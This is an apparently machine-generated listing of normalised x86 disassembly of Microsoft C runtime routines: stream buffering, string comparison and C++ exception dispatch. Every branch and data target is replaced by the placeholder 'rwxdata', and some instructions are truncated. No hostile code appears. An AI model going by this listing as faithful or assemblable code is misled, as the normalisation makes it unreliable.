mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_4234bd
pop ecx
cmp eax 0xffffffff
pop ecx
je rwxdata
test ecx ecx
je rwxdata
cmp ebx eax
mov edi ebx
jb rwxdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg rwxdata
cmp [ ebp + 0x14 ] 0x0
je rwxdata
push esi
call sub_423fbb
test eax eax
pop ecx
jne rwxdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_422780
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp rwxdata
mov edi eax
test ebx ebx
jne rwxdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp rwxdata
mov edi [ ebp - 0x4 ]
jmp rwxdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp rwxdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb rwxdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_42673b
add esp 0xc
cmp eax 0xffffffff
je rwxdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp rwxdata
sub_42b375
mov ecx [ esp + 0x8 ]
dec [ ecx + 0x4 ]
js rwxdata
push ecx
push [ esp + 0x8 ]
call sub_4234bd
pop ecx
pop ecx
retn
mov edx [ ecx ]
mov al [ esp + 0x4 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
retn
sub_42b399
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx 0xffffffff
push esi
je rwxdata
or eax 0xffffffff
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xc ]
test al 0x1
jne rwxdata
cmp [ esi + 0x8 ] 0x0
jne rwxdata
test al 0x80
je rwxdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne rwxdata
push esi
call sub_4268e8
pop ecx
test al 0x2
jne rwxdata
test [ esi + 0xc ] 0x40
je rwxdata
cmp [ esi + 0x4 ] 0x0
jne rwxdata
dec [ esi ]
mov eax [ esi ]
mov [ eax ] bl
dec [ esi ]
mov eax [ esi ]
cmp [ eax ] bl
je rwxdata
inc eax
mov [ esi ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and al 0xef
or al 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp rwxdata
inc eax
mov [ esi ] eax
sub_42b421
push [ esp + 0x4 ]
call sub_42c471
pop ecx
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov edx [ ecx ]
or eax 0xffffffff
and edx [ ecx + 0x4 ]
cmp edx eax
je rwxdata
retn
xor eax eax
sub_42b443
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je rwxdata
mov [ rwxdata ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je rwxdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne rwxdata
cmp edi 0x1
je rwxdata
push esi
call sub_423fbb
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je rwxdata
push esi
call sub_42c5f8
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne rwxdata
test al 0x1
je rwxdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp rwxdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_4266a1
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp rwxdata
test al 0x8
je rwxdata
pop edi
pop esi
retn
test ah 0x4
jne rwxdata
mov [ esi + 0x18 ] 0x200
sub_42b4e7
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x14 ]
cmp ebx 0x4
je rwxdata
push esi
mov esi [ ebp + 0x8 ]
push esi
and edi 0xfffffffe
call sub_423fbb
push esi
call sub_423f55
and [ esi + 0xc ] 0xc2f3
pop ecx
pop ecx
mov ecx [ esi + 0xc ]
test bl 0x4
je rwxdata
cmp edi 0x2
jb rwxdata
mov eax [ ebp + 0xc ]
test eax eax
jne rwxdata
or ecx 0x4
push 0x2
mov [ esi + 0xc ] ecx
lea eax [ esi + 0x14 ]
pop edi
jmp rwxdata
or eax 0xffffffff
jmp rwxdata
cmp edi 0x7fffffff
ja rwxdata
or ch 0x5
mov [ esi + 0xc ] ecx
push edi
call sub_42304d
test eax eax
pop ecx
jne rwxdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x18 ] edi
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop edi
pop ebx
leave
retn
test ebx ebx
je rwxdata
or [ esi + 0xc ] 0x408
jmp rwxdata
inc [ rwxdata ]
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
cmp ebx 0x40
je rwxdata
mov eax [ ebp - 0x4 ]
pop esi
sub_42b596
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
jne rwxdata
add [ esi + 0x4 ] 0xfffffffe
js rwxdata
mov eax [ esi + 0x10 ]
cmp eax 0xffffffff
je rwxdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_42c7e0
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp rwxdata
mov eax rwxdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rwxdata ]
lea eax [ ecx + eax * 8 ]
jmp rwxdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_426952
pop ecx
cmp eax 0xffffffff
pop ecx
jne rwxdata
test [ eax + 0x4 ] 0x80
je rwxdata
cmp eax 0x1
jne rwxdata
mov [ rwxdata ] 0x2a
dec [ esi + 0x4 ]
js rwxdata
dec [ esi + 0x4 ]
js rwxdata
movsx eax [ ebp + 0xc ]
push esi
push eax
call sub_4234bd
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
inc [ esi ]
movzx eax [ ebp + 0xc ]
jmp rwxdata
movsx eax [ ebp + 0xc ]
push esi
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
movzx eax [ ebp + 0xc ]
or ax 0xffff
jmp rwxdata
dec [ esi + 0x4 ]
js rwxdata
cmp eax 0xffffffff
je rwxdata
mov ax [ ebp + 0x8 ]
jmp rwxdata
cmp eax 0xffffffff
je rwxdata
movsx eax [ ebp + 0xd ]
push esi
jmp rwxdata
mov eax [ esi ]
mov cl [ ebp + 0xd ]
mov [ eax ] cl
movzx eax [ ebp + 0xd ]
jmp rwxdata
push eax
call sub_4234bd
pop ecx
pop ecx
inc [ esi ]
jmp rwxdata
sub_42b68b
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp bx 0xffff
push esi
je rwxdata
or ax 0xffff
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
test al 0x1
jne rwxdata
cmp [ esi + 0x8 ] 0x0
jne rwxdata
test al 0x80
je rwxdata
mov eax [ esi + 0xc ]
test al 0x40
jne rwxdata
push esi
call sub_4268e8
pop ecx
test al 0x2
jne rwxdata
mov ecx [ esi ]
cmp ecx [ esi + 0x8 ]
jne rwxdata
mov ecx [ esi + 0x10 ]
cmp ecx 0xffffffff
je rwxdata
add [ esi + 0x4 ] 0x2
and al 0xef
or al 0x1
add [ esi ] 0xfffffffe
mov [ esi + 0xc ] eax
mov eax [ esi ]
mov [ eax ] bx
mov eax [ esi ]
mov ax [ eax ]
jmp rwxdata
cmp [ esi + 0x4 ] 0x0
jne rwxdata
mov ecx rwxdata
mov edx ecx
sar edx 0x5
and ecx 0x1f
mov edx [ edx * 4 + rwxdata ]
lea ecx [ edx + ecx * 8 ]
jmp rwxdata
pop esi
pop ebx
pop ebp
retn
add ecx 0x2
mov [ esi ] ecx
lea eax [ ebp + 0x8 ]
push ebx
push eax
call sub_426952
pop ecx
cmp eax 0xffffffff
pop ecx
jne rwxdata
test [ ecx + 0x4 ] 0x80
je rwxdata
mov ecx [ esi ]
cmp ecx [ esi + 0x8 ]
jne rwxdata
mov [ rwxdata ] 0x2a
cmp eax 0x1
je rwxdata
cmp [ esi + 0x4 ] 0x0
jne rwxdata
dec [ esi ]
mov ecx [ esi ]
mov dl [ ebp + 0x8 ]
mov [ ecx ] dl
add [ esi + 0x4 ] eax
mov eax [ esi + 0xc ]
and al 0xef
or al 0x1
mov [ esi + 0xc ] eax
mov ax bx
jmp rwxdata
dec [ esi ]
mov ecx [ esi ]
mov dl [ ebp + 0x9 ]
mov [ ecx ] dl
add ecx eax
mov [ esi ] ecx
sub_42b774
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
test [ esi + 0xc ] 0x40
jne rwxdata
add [ esi + 0x4 ] 0xfffffffe
js rwxdata
mov eax [ esi + 0x10 ]
cmp eax 0xffffffff
je rwxdata
push esi
call sub_42c904
pop ecx
mov ecx [ esi ]
mov ax [ ecx ]
add ecx 0x2
mov [ esi ] ecx
jmp rwxdata
mov eax rwxdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rwxdata ]
lea eax [ ecx + eax * 8 ]
jmp rwxdata
pop edi
pop esi
leave
retn
dec [ esi + 0x4 ]
push 0x1
pop edi
js rwxdata
test [ eax + 0x4 ] 0x80
je rwxdata
push esi
call sub_42c398
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp rwxdata
mov ecx [ rwxdata ]
mov [ ebp - 0x4 ] al
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je rwxdata
or ax 0xffff
jmp rwxdata
cmp eax 0xffffffff
jne rwxdata
lea eax [ ebp - 0x4 ]
push edi
push eax
lea eax [ ebp + 0xa ]
push eax
call sub_42c9e8
add esp 0xc
cmp eax 0xffffffff
jne rwxdata
dec [ esi + 0x4 ]
js rwxdata
mov ax [ ebp + 0xa ]
jmp rwxdata
mov [ rwxdata ] 0x2a
jmp rwxdata
push esi
call sub_42c398
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp rwxdata
push 0x2
mov [ ebp - 0x3 ] al
pop edi
movsx eax [ ebp - 0x4 ]
push esi
push eax
call sub_42b399
pop ecx
pop ecx
jmp rwxdata
cmp eax 0xffffffff
jne rwxdata
sub_42b87d
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] rwxdata
push [ edi ]
call sub_4224c0
inc eax
push eax
call sub_42b588
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je rwxdata
mov [ esi + 0x8 ] 0x1
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi ]
push eax
call sub_422540
pop ecx
pop ecx
sub_42b8ba
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] rwxdata
mov eax [ edi + 0x8 ]
test eax eax
mov [ esi + 0x8 ] eax
je rwxdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
call sub_4224c0
inc eax
push eax
call sub_42b588
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je rwxdata
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi + 0x4 ]
push eax
call sub_422540
pop ecx
pop ecx
jmp rwxdata
sub_42b927
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi rwxdata
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_42b970
mov eax [ esp + 0xc ]
test eax eax
je rwxdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je rwxdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je rwxdata
test eax 0x1
je rwxdata
test eax eax
je rwxdata
[ esi ] [ edi ]
je rwxdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne rwxdata
mov cl [ esi ]
cmp cl [ edi ]
jne rwxdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne rwxdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne rwxdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne rwxdata
inc esi
inc edi
dec eax
je rwxdata
mov eax 0x0
dec eax
je rwxdata
cmp ch dh
jne rwxdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne rwxdata
pop edi
pop esi
retn
cmp dh ch
jne rwxdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne rwxdata
dec eax
je rwxdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne rwxdata
dec eax
sub_42ba20
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne rwxdata
test edx 0x1
je rwxdata
mov eax [ edx ]
cmp al [ ecx ]
jne rwxdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne rwxdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne rwxdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je rwxdata
or al al
je rwxdata
inc ecx
or al al
je rwxdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne rwxdata
cmp ah [ ecx + 0x1 ]
jne rwxdata
test edx 0x2
je rwxdata
or ah ah
je rwxdata
or ah ah
je rwxdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne rwxdata
add ecx 0x2
jmp rwxdata
or al al
je rwxdata
cmp ah [ ecx + 0x3 ]
jne rwxdata
add ecx 0x4
add edx 0x4
or ah ah
jne rwxdata
mov edi edi
sub_42baa4
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je rwxdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je rwxdata
call sub_42c342
cmp [ esi + 0xc ] 0x0
je rwxdata
cmp [ esi + 0x4 ] 0x0
je rwxdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne rwxdata
cmp [ ebp + 0x1c ] 0x0
jne rwxdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_42bb3f
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe rwxdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_42bdeb
add esp 0x10
jmp rwxdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je rwxdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp rwxdata
pop edi
pop esi
pop ebp
retn
sub_42bb3f
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl rwxdata
call sub_42c342
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl rwxdata
cmp [ ebp + 0x1c ] 0x0
jne rwxdata
cmp [ esi + 0x10 ] 0x3
jne rwxdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne rwxdata
jmp sub_42c2ec
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_42bce6
add esp 0x20
jmp rwxdata
cmp [ esi ] ebx
jne rwxdata
cmp [ esi + 0x14 ] edi
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne rwxdata
cmp [ esi + 0x1c ] 0x0
jne rwxdata
cmp [ esi + 0x14 ] edi
jne rwxdata
mov esi [ rwxdata ]
test esi esi
je rwxdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_42b1ce
add esp 0x14
mov ebx eax
mov eax [ rwxdata ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_42cb14
pop ecx
test eax eax
pop ecx
jne rwxdata
cmp [ ebp + 0x1c ] 0x0
je rwxdata
cmp [ ebx ] edi
jg rwxdata
cmp [ esi ] ebx
jne rwxdata
call sub_42c342
push 0x1
push esi
call sub_42c214
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp rwxdata
cmp edi [ ebx + 0x4 ]
jg rwxdata
cmp [ esi + 0x10 ] 0x3
jne rwxdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae rwxdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle rwxdata
cmp [ esi + 0x14 ] edi
jne rwxdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle rwxdata
cmp [ esi + 0x1c ] 0x0
jne rwxdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg rwxdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_42bd8e
add esp 0xc
test eax eax
jne rwxdata
call sub_42c342
jmp rwxdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_42be9f
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg rwxdata
sub_42bce6
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rwxdata ] 0x0
push esi
push edi
je rwxdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_42b1ce
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42b0a5
add esp 0x1c
test eax eax
jne rwxdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl rwxdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp rwxdata
cmp edi [ esi + 0x4 ]
jg rwxdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae rwxdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je rwxdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42be9f
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne rwxdata
sub_42bd8e
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je rwxdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je rwxdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je rwxdata
test [ esi ] 0x2
je rwxdata
add ecx 0x8
push ecx
push edx
call sub_42ba20
pop ecx
test eax eax
pop ecx
jne rwxdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je rwxdata
test [ edi ] 0x8
je rwxdata
xor eax eax
jmp rwxdata
test al 0x2
je rwxdata
test [ edi ] 0x1
je rwxdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne rwxdata
sub_42bdeb
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle rwxdata
call sub_42c342
cmp esi [ edi + 0x4 ]
jl rwxdata
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
push 0x103
push ebx
push eax
call sub_42c2a0
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je rwxdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp rwxdata
cmp esi [ ebp + 0x14 ]
je rwxdata
sub_42be9f
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je rwxdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne rwxdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_42c050
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp rwxdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_42af65
call sub_42afa7
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_42bdeb
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_42bf1a
add esp 0x2c
test eax eax
je rwxdata
sub_42bf1a
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi [ ebp + 0xc ]
mov ecx [ esi - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ rwxdata ]
mov [ ebp - 0x1c ] ecx
mov ecx [ rwxdata ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp + 0x8 ]
mov [ rwxdata ] edi
mov ecx [ ebp + 0x10 ]
mov [ rwxdata ] ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_42b02c
add esp 0x14
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] ebx
or [ ebp - 0x4 ] 0xffffffff
call sub_42bfe0
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_42bfe0
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ rwxdata ] eax
mov eax [ ebp - 0x20 ]
mov [ rwxdata ] eax
cmp [ edi ] 0xe06d7363
jne rwxdata
retn
cmp [ edi + 0x10 ] 0x3
jne rwxdata
cmp [ edi + 0x14 ] 0x19930520
jne rwxdata
cmp [ ebp - 0x24 ] ebx
jne rwxdata
cmp [ ebp - 0x2c ] ebx
je rwxdata
call sub_424b82
push eax
push edi
call sub_42c214
pop ecx
pop ecx
sub_42c026
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne rwxdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne rwxdata
cmp [ eax + 0x14 ] 0x19930520
jne rwxdata
cmp [ eax + 0x1c ] 0x0
jne rwxdata
push 0x1
pop eax
retn
sub_42c050
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je rwxdata
mov eax [ ecx + 0x8 ]
test eax eax
je rwxdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je rwxdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je rwxdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_42cb14
pop ecx
pop ecx
test eax eax
je rwxdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne rwxdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_42cb14
pop ecx
pop ecx
test eax eax
je rwxdata
call sub_42c342
push 0x1
push edi
call sub_42cb30
pop ecx
pop ecx
test eax eax
je rwxdata
call sub_42cb14
pop ecx
pop ecx
test eax eax
je rwxdata
call sub_42cb14
pop ecx
pop ecx
test eax eax
je rwxdata
push 0x1
push edi
call sub_42cb30
pop ecx
pop ecx
test eax eax
je rwxdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_42cb30
pop ecx
pop ecx
test eax eax
je rwxdata
push 0x1
push edi
call sub_42cb30
pop ecx
pop ecx
test eax eax
je rwxdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_427650
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne rwxdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_42cb4c
pop ecx
test eax eax
je rwxdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_42c27b
pop ecx
pop ecx
push eax
push edi
call sub_427650
add esp 0xc
jmp rwxdata
mov eax [ edi ]
test eax eax
je rwxdata
test [ esi ] 0x4
je rwxdata
add esi 0x8
push esi
jmp rwxdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_42c27b
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_42af99
jmp rwxdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_42c27b
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_42afa0
jmp rwxdata
push eax
call sub_42c27b
pop ecx
pop ecx
mov [ edi ] eax
jmp rwxdata
sub_42c214
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je rwxdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_42af99
or [ ebp - 0x4 ] 0xffffffff
sub_42c27b
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl rwxdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_42c2a0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
